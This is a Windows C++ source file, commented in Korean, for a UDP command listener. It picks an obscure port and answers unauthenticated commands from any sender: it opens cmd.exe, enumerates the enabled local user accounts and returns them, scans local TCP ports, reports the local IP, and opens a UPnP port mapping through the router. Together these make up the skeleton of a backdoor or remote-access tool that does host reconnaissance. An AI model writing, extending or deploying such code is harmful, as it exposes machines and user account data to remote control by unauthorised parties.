#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define NODRAWTEXT      // DrawText()와 DT_* 매크로 제외
#define NOGDI           // GDI 기능을 제외 (폰트, 비트맵 등 안 쓸 때)
#define NOKANJI         // 한자 지원 제외
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shellapi.h>
#include <lm.h>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")

#include <iostream>
#include <unordered_set>
#include <vector>
#include <algorithm>
#include <string>
#include <locale>
#include <codecvt>
// 사용자 정의 헤더 임포트
#include "port.hpp"
#include "upnp.hpp"

using namespace std;
namespace init {
	void init_unfamousPortList();
	void init_unfamousPortListVector();
	void init();
}

unordered_set<unsigned short> unfamousPortList = { 42424, 65535 }; // 기본적으로 거의 안쓰이는 포트들
void init::init_unfamousPortList() {
	for (unsigned short i = 27783; i <= 27875; i++) unfamousPortList.insert(i); // 현재 공식 서비스 중 등록되지 않은 포트들
}

vector<unsigned short> unfamousPortListVector;
void init::init_unfamousPortListVector() {
	unfamousPortListVector.assign(unfamousPortList.begin(), unfamousPortList.end());
	sort(unfamousPortListVector.begin(), unfamousPortListVector.end());
}

unsigned short pick_random_port() {
	for (auto it = unfamousPortList.begin(); it != unfamousPortList.end(); ++it) {
		unsigned short p = *it;
		if (port::check_port_tcp(p) != 1) continue;
		if (port::check_port_udp(p) != 1) continue;
		unfamousPortList.erase(it);
		return p;
	}
	return 0;
}

vector<string> get_username_list() {
	LPUSER_INFO_1 pBuf = NULL;
	DWORD entriesRead = 0, totalEntries = 0, resumeHandle = 0;

	NET_API_STATUS nStatus = NetUserEnum(NULL, 1, FILTER_NORMAL_ACCOUNT, reinterpret_cast<LPBYTE*>(&pBuf), MAX_PREFERRED_LENGTH, &entriesRead, &totalEntries, &resumeHandle);

	vector<string> user_list;

	if (nStatus == NERR_Success || nStatus == ERROR_MORE_DATA) {
		for (DWORD i = 0; i < entriesRead; i++) {

			if (pBuf[i].usri1_flags & UF_ACCOUNTDISABLE) continue;

			int size_needed = WideCharToMultiByte(CP_ACP, 0, pBuf[i].usri1_name, -1, NULL, 0, NULL, NULL);
			string strTo(size_needed - 1, 0);
			WideCharToMultiByte(CP_ACP, 0, pBuf[i].usri1_name, -1, &strTo[0], size_needed, NULL, NULL);
			user_list.push_back(strTo);
		}
	}

	if (pBuf != NULL) {
		NetApiBufferFree(pBuf);
	}

	return user_list;
}

template <typename T>
void print_vector(const vector<T>& v) {
	for (T v1 : v) {
		cout << v1 << " ";
	}
	cout << endl;
}

void init::init() {
	init::init_unfamousPortList();
	init::init_unfamousPortListVector();
}

int main() {
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		cout << "WSAStartup 실패: " << WSAGetLastError() << endl;
		return 0;
	}

	init::init();
	unsigned short udpListenPort = 0;
	unsigned short udpSendPort;
	udpListenPort = pick_random_port();
	udpSendPort = pick_random_port();
	if (udpListenPort == 0) {
		cout << udpListenPort << endl;
		cout << "현재 사용 가능한 포트가 없습니다." << endl;
		return 0;
	}
	if (udpSendPort == 0) {
		cout << udpListenPort << endl;
		cout << "현재 사용 가능한 포트가 없습니다." << endl;
		return 0;
	}
	SOCKET udpListenSock;
	SOCKET udpSendSock;

	// udpsendSock 초기화
	int udpSendSock_result = port::create_send_sock_udp(udpSendPort, &udpSendSock);
	if (udpSendSock_result != 1) {
		cout << "udp포트 전송 소켓을 만들던 중 실패하였습니다!" << endl;
		WSACleanup();
		return 0;
	}

	// udp포트나 tcp포트가 이미 점유되어있는지 확인
	 int ot = port::check_port_tcp(udpListenPort);
	 int ou = port::check_port_udp(udpListenPort);

	if (ot != 1 || ou != 1) {
		cout << udpListenPort << "번 포트는 사용이 불가능합니다." << endl;
		WSACleanup();
		return 0;
	}

	int r = port::open_udp_port(udpListenPort, &udpListenSock);
	
	if (r == -1) {
		cout << udpListenPort << "번 포트를 여는 도중, 에러가 발생하였습니다." << endl;
		WSACleanup();
		return 0;
	}

	cout << udpListenPort << "번 포트에서 듣는중..." << endl;

	struct sockaddr_in server;
	ZeroMemory(&server, sizeof(server));
	port::create_server_sock_udp(udpListenPort, &server);
	
	while (1) {
		char buf[2048];
		struct sockaddr_in from;
		int fromLen = sizeof(from);

		int len = recvfrom(
			udpListenSock,
			buf,
			sizeof(buf) - 1,
			0,
			(struct sockaddr*)&from,
			&fromLen
		);

		if (len == SOCKET_ERROR) {
			cout << "recvfrom 에러: " << WSAGetLastError() << endl;
			break;
		}

		buf[len] = 0;
		char ip[INET_ADDRSTRLEN]{};
		inet_ntop(AF_INET, &from.sin_addr, ip, sizeof(ip));
		cout << ip << " -> " << ntohs(from.sin_port) << " " << buf << "에서" << endl;

		string receivedString = string(buf);

		if (receivedString == "!help") {
			const string reply = "open cmd\\nget user\\nscan ports tcp";
			sendto(
				udpListenSock,
				reply.c_str(),
				static_cast<int>(reply.length()),
				0,
				reinterpret_cast<const struct sockaddr*>(&from),
				fromLen
			);
			continue;
		}

		if (receivedString == "open cmd") {
			ShellExecuteA(NULL, "open", "cmd.exe", "/k echo 케케크롱", NULL, SW_SHOWNORMAL);
			const string reply = "successfully opened cmd";
			sendto(
				udpListenSock,
				reply.c_str(),
				static_cast<int>(reply.length()),
				0,
				reinterpret_cast<const struct sockaddr*>(&from),
				fromLen
			);
			continue;
		}
		if (receivedString == "get user") {
			vector<string> lst = get_username_list();
			string reply = "";
			for (string name : lst) {
				reply += name;
				reply += "\\n";
			}
			sendto(
				udpListenSock,
				reply.c_str(),
				static_cast<int>(reply.length()),
				0,
				reinterpret_cast<const struct sockaddr*>(&from),
				fromLen
			);
			continue;
		}
		if (receivedString == "scan ports tcp") {
			const vector<unsigned short> ports = port::scan_target_ports_tcp("127.0.0.1", unfamousPortListVector);
			string reply = "";
			for (unsigned short p : ports) {
				reply += to_string(p);
				reply += "\\n";
			}
			sendto(
				udpListenSock,
				reply.c_str(),
				static_cast<int>(reply.length()),
				0,
				reinterpret_cast<const struct sockaddr*>(&from),
				fromLen
			);
			continue;
		}
		if (receivedString == "get local ip") {
			const string reply = upnp::get_local_ip();
			sendto(
				udpListenSock,
				reply.c_str(),
				static_cast<int>(reply.length()),
				0,
				reinterpret_cast<const struct sockaddr*>(&from),
				fromLen
			);
			continue;
		}
		if (receivedString == "open upnp port") {
			const unsigned short randomPort = pick_random_port();
			const string IP = upnp::get_local_ip();
			cout << "IP: " << IP << " port: " << randomPort << endl;
			cout << upnp::map_port_upnp(randomPort, IP) << endl;
		}
		
		const string reply = "Hello from UDP server\n";
		sendto(
			udpListenSock,
			reply.c_str(),
			static_cast<int>(reply.length()),
			0,
			reinterpret_cast<const struct sockaddr*>(&from),
			fromLen
		);
	}


	closesocket(udpListenSock);
	closesocket(udpSendSock);
	WSACleanup();

	return 0;
}